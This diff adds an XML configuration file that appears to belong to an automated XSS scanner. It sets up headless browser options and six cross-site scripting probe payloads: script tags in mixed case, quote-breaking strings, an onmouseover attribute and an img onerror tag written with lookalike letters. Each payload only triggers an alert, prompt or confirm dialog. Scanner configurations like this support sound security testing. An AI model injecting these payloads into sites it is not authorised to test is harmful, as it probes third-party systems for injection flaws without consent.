@@ -1,0 +1,17 @@
+<xss>
+    <!-- 其他配置 -->
+    <PAYLOADS>
+        <item><![CDATA[<SCRiPT>alert('%s')</SCRiPT>]]></item>
+        <item><![CDATA[<scrIpt>prompt('%s');</scrIpt>]]></item>
+        <item><![CDATA[<scrIpt>confirm('%s');</scrIpt>]]></item>
+        <item><![CDATA[';alert('%s');//]]></item>
+        <item><![CDATA[" onmouseover=alert('%s')"]]></item>
+        <item><![CDATA[<img src="#" οnerrοr=alert('%s')>]]></item>
+    </PAYLOADS>
+    <BROWSER_ARGS>
+        <item>--disable-notifications</item>
+        <item>--disable-popup-blocking</item>
+        <item>--disable-dev-shm-usage</item>
+        <item>--headless</item>
+    </BROWSER_ARGS>
+</xss>
